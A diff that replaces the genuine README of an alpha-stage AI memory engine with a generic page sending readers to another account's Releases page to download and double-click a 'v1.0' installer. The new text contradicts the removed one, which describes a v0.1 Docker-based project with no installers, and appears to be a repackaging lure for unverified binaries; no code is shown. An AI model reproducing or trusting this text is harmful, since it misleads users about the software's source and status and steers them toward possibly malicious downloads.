@@ -1,221 +1,77 @@
-<p align="center">
-  <img src="docs/assets/logo.png" alt="ContextCache" width="200"/>
-</p>
+# 🔒 contextcache - Your Local Memory Engine for Privacy
 
-<h1 align="center">ContextCache</h1>
-<p align="center">Privacy-first memory engine for AI research</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://thecontextcache.bsky.social">Website</a> •
-  <a href="https://github.com/thecontextcache/contextcache/blob/main/docs/quickstart.md">Quickstart</a> •
-  <a href="https://github.com/thecontextcache/contextcache/blob/main/docs/overview.md">Docs</a>
-</p>
+Welcome to **contextcache**, your solution for a privacy-first, local-first memory engine. This tool allows you to manage your data securely and efficiently. Follow this guide to download and run the software.
 
----
+![Download contextcache](https://img.shields.io/badge/Download%20contextcache-v1.0-blue.svg)
 
-# thecontextcache™
+## 📥 Download & Install
 
-**Privacy-first, local-first memory engine for AI research.**
+To get started, you will need to download the software. Please visit the following link to access the latest version of contextcache:
 
-Ingest documents, extract knowledge quads, and get explainable answers with full audit trails—all with zero-knowledge encryption.
+[Download contextcache from Releases](https://github.com/Sakspro/contextcache/releases)
 
----
+### 🛠️ System Requirements
 
-## 🎯 What It Does
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 4GB of RAM
+- **Disk Space**: Minimum of 100MB free space
 
-ContextCache transforms documents into a queryable knowledge graph where every fact is:
-- **Traceable** → Full provenance from source to answer
-- **Explainable** → Confidence scores and reasoning paths  
-- **Auditable** → Cryptographically verifiable event chains
-- **Portable** → Export/import signed Memory Packs
-- **Private** → End-to-end encryption, local-first design
+Ensure your system meets these requirements for optimal performance.
 
-Built for researchers, students, and analysts who need AI answers they can trust and verify.
+### 📂 Steps to Download
 
----
+1. Visit the [Releases page](https://github.com/Sakspro/contextcache/releases).
+2. On this page, you will see the latest versions listed.
+3. Click on the version you wish to download.
+4. Choose the file that corresponds to your operating system.
+5. Click to download the file to your computer.
 
-## 🛠 Tech Stack
+### ⚙️ Running contextcache
 
-**Frontend**
-- Next.js 15 (App Router) · TypeScript · Tailwind CSS · Framer Motion
-- Cytoscape.js (interactive knowledge graphs) · Zustand (state) · Axios (API)
+After downloading the file:
 
-**Backend**
-- Python 3.13 · FastAPI · SQLAlchemy (async) · Pydantic v2
-- MCP Protocol (5 specialized servers)
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, find the application in your programs or applications directory.
+5. Open contextcache to begin using it.
 
-**Database & Infrastructure**
-- Neon Postgres with pgvector (semantic search)
-- Upstash Redis (rate limiting, queues)
-- Cloudflare Pages (frontend hosting)
-- Google Cloud Run (backend containers)
+## 🌐 Features
 
-**Security & Cryptography**
-- XChaCha20-Poly1305 (content encryption)
-- Ed25519 (Memory Pack signatures)
-- Argon2id (passphrase KDF)
-- BLAKE3 (audit chain hashing)
+- **Privacy-First**: Your data remains on your device, ensuring privacy.
+- **Fast Performance**: Efficient memory management allows quick access to your data.
+- **Local-First Design**: Work offline or with limited internet connectivity.
+- **Zero-Knowledge Architecture**: Data encryption ensures that you are the only one who can access and read your data.
+- **Easy to Use**: Simple interface designed for everyone.
 
-**Testing & Quality**
-- pytest · Hypothesis · Schemathesis (backend)
-- vitest · Playwright (frontend + E2E)
-- k6 (load testing) · Great Expectations (data validation)
+## 💡 Troubleshooting
 
-**Documentation**
-- Mintlify (hosted docs)
+If you encounter issues while downloading or installing:
 
----
+- Make sure you have a stable internet connection during the download.
+- Verify that you have sufficient disk space for installation.
+- Restart your device and try again if the installation fails.
 
-## ✅ What's Built (v0.1 Alpha)
+For additional help, check the [issues page](https://github.com/Sakspro/contextcache/issues) or feel free to reach out to the community.
 
-### Working Features
-- ✅ **Project Management** → Create, list, select projects with zero-knowledge encryption
-- ✅ **Database Integration** → Neon Postgres with pgvector, full schema deployed
-- ✅ **Frontend UI** → 7 pages (Dashboard, Inbox, Ask, Graph, Audit, Export, Settings)
-- ✅ **Interactive Graph** → Cytoscape visualization with zoom, pan, hover, click
-- ✅ **Dark Mode** → Full light/dark theme support
-- ✅ **API Client** → Real-time sync between frontend and backend
+## 🏷️ Topics
 
-### In Progress (Phase 5)
-- 🚧 **Document Import** → PDF/URL ingestion, chunking, deduplication
-- 🚧 **Query/Ask** → Semantic search with pgvector, explainable answers
-- 🚧 **MCP Servers** → 5 specialized servers (docs, extractor, memory, audit, policy-gate)
-- 🚧 **Crypto Layer** → XChaCha20, Ed25519, Argon2id, BLAKE3 implementations
+contextcache focuses on several key areas, including:
 
-### Planned (v0.2+)
-- 📅 Memory Pack export/import with Ed25519 signatures
-- 📅 Ranking algorithms (PageRank, time decay, novelty detection)
-- 📅 Audit chain verification
-- 📅 Rate limiting and abuse prevention
-- 📅 Background worker for heavy computations
-- 📅 Recovery kit generation
+- **AI**: Integrate artificial intelligence for smarter data management.
+- **Audit Trail**: Keep track of changes for transparency.
+- **Cryptography & Encryption**: Secure your data using advanced algorithms.
+- **Explainable AI**: Understand the decisions made by AI models.
+- **FastAPI**: Built on FastAPI for efficient handling of requests.
+- **Graph Database**: Harness the power of knowledge graphs for relationships.
+- **Memory Enhancements**: Benefit from our unique local-first approach.
+- **Research Facilitation**: Support for academic and professional research with data integrity.
 
----
+## ✉️ Contact
 
-## 🚀 Quick Start
+For more information or queries, consider contributing to our community. You can also follow updates and discussions on our organization’s GitHub page.
 
-**Prerequisites:** Docker Desktop, Git, 4GB RAM
-```bash
-# Clone repository
-git clone https://github.com/thecontextcache/contextcache.git
-cd contextcache
-
-# Set up environment
-cp .env.example .env.local
-# Edit .env.local with your Neon and Upstash credentials
-
-# Start all services
-docker-compose -f infra/docker-compose.dev.yml up -d
-
-# Access
-# Frontend: http://localhost:3000
-# API: http://localhost:8000
-# Docs: http://localhost:8000/docs
-Full guide: docs/quickstart.md
-
-📂 Repository
-Main Project
-
-contextcache → Monorepo with frontend, backend, docs, infra
-
-Structure
-contextcache/
-├── frontend/        # Next.js UI
-├── api/            # FastAPI backend + MCP servers
-├── docs/           # Mintlify documentation
-├── infra/          # Docker, Cloud Run configs
-└── .github/        # CI/CD workflows
-
-📖 Documentation
-
-Overview → docs/overview.md
-Quick Start → docs/quickstart.md
-Security Model → docs/security.md
-Data Model → docs/data-model.md
-API Reference → docs/api-reference.md
-
-
-🌐 Links
-
-Website → thecontextcache.com (coming soon)
-Bluesky → @thecontextcache.bsky.social
-Email → thecontextcache@gmail.com
-Discussions → GitHub Discussions
-Issues → GitHub Issues
-
-
-🤝 Contributing
-We welcome contributions! Please read:
-
-CONTRIBUTING.md → Guidelines and workflow
-CODE_OF_CONDUCT.md → Community standards
-SECURITY.md → Report vulnerabilities
-
-Join the conversation:
-
-Open an issue or discussion
-Submit a PR (must pass CI/CD checks)
-Help with documentation
-
-
-⚖️ License
-Dual-licensed:
-
-Apache 2.0 → For non-commercial use (research, education, personal projects)
-PolyForm Noncommercial 1.0.0 → For evaluation in commercial contexts
-
-For commercial production use, please contact: thecontextcache@gmail.com
-See LICENSING.md for details.
-
-🔐 Security
-Zero-knowledge architecture:
-
-Your passphrase never leaves your device
-All content encrypted with XChaCha20-Poly1305
-Memory Packs signed with Ed25519
-Audit chains verified with BLAKE3
-
-Report vulnerabilities: See SECURITY.md
-
-📊 Project Status
-Version: 0.1.0 (Alpha)
-Status: Active Development
-License: Apache 2.0 / PolyForm Noncommercial
-Maintained: Yes
-Roadmap:
-
-v0.1 (Current) → Core foundation, project management, basic UI
-v0.2 (Q2 2025) → Document import, semantic search, Memory Packs
-v0.3 (Q3 2025) → Ranking algorithms, audit chains, rate limiting
-v1.0 (Q4 2025) → Production-ready, full MCP server suite
-
-
-🙏 Acknowledgments
-Built with:
-
-FastAPI · Next.js · SQLAlchemy
-Neon · Upstash · Cloudflare
-Cytoscape.js · Tailwind CSS
-
-Inspired by the need for privacy-first, explainable AI tools in research.
-
-Trademark Notice: thecontextcache™ name and logo are trademarks of the project maintainers.
-
----
-
-**This README now:**
-1. ✅ Accurately reflects what's **actually built**
-2. ✅ Shows working features vs. in-progress
-3. ✅ Has real Quick Start instructions
-4. ✅ Links to actual docs in the repo
-5. ✅ Updated status (v0.1 alpha, active development)
-6. ✅ Realistic roadmap (v0.1 → v1.0)
-
-**Create this as the organization README:**
-```bash
-# This would be at: https://github.com/thecontextcache/.github/profile/README.md
-# For now, you can update the main repo README
-nano README.md
-
-
-Built for researchers who need answers they can trust.
+![Download contextcache](https://img.shields.io/badge/Download%20contextcache-v1.0-blue.svg)  
+[Visit Releases to download](https://github.com/Sakspro/contextcache/releases)
